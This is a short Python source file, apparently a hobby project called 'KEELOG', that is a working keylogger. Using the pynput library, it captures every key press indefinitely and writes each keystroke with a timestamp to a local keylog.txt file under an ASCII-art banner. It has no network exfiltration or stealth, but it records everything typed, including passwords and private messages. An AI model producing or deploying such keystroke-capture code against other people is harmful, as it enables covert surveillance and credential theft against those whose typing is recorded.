import os
from datetime import datetime
from pynput import keyboard

key_list = list()
shift = False


logo = (
    '██╗  ██╗███████╗███████╗██╗      ██████╗  ██████╗ \n' +
    '██║ ██╔╝██╔════╝██╔════╝██║     ██╔═══██╗██╔════╝ \n' +
    '█████╔╝ █████╗  █████╗  ██║     ██║   ██║██║  ███╗\n' +
    '██╔═██╗ ██╔══╝  ██╔══╝  ██║     ██║   ██║██║   ██║\n' +
    '██║  ██╗███████╗███████╗███████╗╚██████╔╝╚██████╔╝\n' +
    '╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝ ╚═════╝  ╚═════╝ \n' +
    ''
)


# Logs list of keys to a text file
def log(list_of_keys):
    with (open('keylog.txt', 'a') as keylog):
        for key in list_of_keys:
            result = str(key).replace("'", '')      # Remove surrounding quotes
            keylog.write(datetime.now().strftime('%m/%d/%Y, %H:%M:%S\t') + result + "\n")   # Log with time
            list_of_keys.clear()    # Empty the list


# Registers a key press event
def key_pressed(key):
    try:
        key_list.append(key)    # Save key to list of keys
        log(key_list)           # Log list of keys
    except:
        pass


# Main Program
try:
    if not os.path.isfile('keylog.txt'):    # On the first run, include the logo
        with (open('keylog.txt', 'w') as new_file):
            new_file.write(logo)
            new_file.write(datetime.now().strftime('%m/%d/%Y, %H:%M:%S\t') + "KEELOG WAS STARTED" + "\n")
    else:
        with (open('keylog.txt', 'a') as existing_file):
            existing_file.write("\n\n" + datetime.now().strftime('%m/%d/%Y, %H:%M:%S\t') + "KEELOG WAS STARTED" + "\n")

    # Listed for keyboard inputs indefinitely
    with keyboard.Listener(on_press=key_pressed) as listener:
        listener.join()
except KeyboardInterrupt:
    pass
